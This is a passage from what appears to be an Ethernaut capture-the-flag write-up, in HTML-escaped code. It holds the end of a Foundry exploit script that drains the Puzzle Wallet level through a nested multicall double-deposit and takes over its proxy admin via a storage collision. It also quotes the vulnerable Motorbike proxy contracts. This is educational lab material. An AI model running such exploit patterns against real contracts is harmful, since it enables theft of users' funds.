&lt;&#x2F;span&gt;&lt;span&gt;        _nestedMulti[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSelector&lt;&#x2F;span&gt;&lt;span&gt;(wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;multicall&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;selector&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_depositSelector)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; multicall calldata
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; [deposit selector, multicall selector [deposit] ]
&lt;&#x2F;span&gt;&lt;span&gt;        wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;multicall{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.001 &lt;&#x2F;span&gt;&lt;span&gt;ether}(_nestedMulti)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Wallet Balance : 0.002 ETH
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Balance[msg.sender] = Balance[Attacker] = 0.003 ETH
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Call Execute function with amount 0.002
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.002 &lt;&#x2F;span&gt;&lt;span&gt;ether&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Now Wallet Balance ==&amp;gt; 0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; wallet.setMaxBalance(uint256(uint160(address(this))));
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        wallet&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setMaxBalance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint160&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602&lt;&#x2F;span&gt;&lt;span&gt;))))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; sets proxyAdmin
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;receive&lt;&#x2F;span&gt;&lt;span&gt;() payable external{}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;            &#x2F;&#x2F; Proxy                            &#x2F;&#x2F; Wallet
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;        address public pendingAdmin;    |  address public owner;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;        address public admin;           |  uint256 public maxBalance;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;*&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;PuzzleWalletSolve.s.sol:PuzzleWalletSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;25-motorbike&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#25-motorbike&quot; aria-label=&quot;Anchor link for: 25-motorbike&quot;&gt;25 Motorbike&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Motorbike.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;openzeppelin-contracts-06&#x2F;utils&#x2F;Address.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;openzeppelin-contracts-06&#x2F;proxy&#x2F;Initializable.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Motorbike {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; keccak-256 hash of &amp;quot;eip1967.proxy.implementation&amp;quot; subtracted by 1
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 internal constant _IMPLEMENTATION_SLOT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    struct AddressSlot {
&lt;&#x2F;span&gt;&lt;span&gt;        address value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address _logic) public {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(Address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isContract&lt;&#x2F;span&gt;&lt;span&gt;(_logic)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ERC1967: new implementation is not a contract&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_getAddressSlot&lt;&#x2F;span&gt;&lt;span&gt;(_IMPLEMENTATION_SLOT)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_logic&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_logic&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;initialize()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        )&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Call failed&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Delegates the current call to `implementation`.
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_delegate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address implementation&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal virtual &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; solhint-disable-next-line no-inline-assembly
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calldatacopy&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calldatasize&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;gas&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;implementation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;calldatasize&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;returndatacopy&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;returndatasize&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;switch &lt;&#x2F;span&gt;&lt;span&gt;result
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;{ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;revert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;returndatasize&lt;&#x2F;span&gt;&lt;span&gt;()) }
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;default &lt;&#x2F;span&gt;&lt;span&gt;{ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;returndatasize&lt;&#x2F;span&gt;&lt;span&gt;()) }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Fallback function that delegates calls to the address returned by `_implementation()`. 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Will run if no other function in the contract matches the call data
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fallback &lt;&#x2F;span&gt;&lt;span&gt;() external payable virtual {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_delegate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_getAddressSlot&lt;&#x2F;span&gt;&lt;span&gt;(_IMPLEMENTATION_SLOT)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Returns an `AddressSlot` with member `value` located at `slot`.
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_getAddressSlot&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes32 slot&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal pure returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;AddressSlot storage r&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;r_slot &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;slot
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Engine is Initializable {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; keccak-256 hash of &amp;quot;eip1967.proxy.implementation&amp;quot; subtracted by 1
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 internal constant _IMPLEMENTATION_SLOT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    address public upgrader&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public horsePower&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    struct AddressSlot {
&lt;&#x2F;span&gt;&lt;span&gt;        address value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;initialize&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external initializer &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        horsePower &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        upgrader &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Upgrade the implementation of the proxy to `newImplementation`
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; subsequently execute the function call
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;upgradeToAndCall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address newImplementation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes memory data&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_authorizeUpgrade&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_upgradeToAndCall&lt;&#x2F;span&gt;&lt;span&gt;(newImplementation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;data)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Restrict to upgrader role
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_authorizeUpgrade&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal view &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;upgrader&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Can&amp;#39;t upgrade&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
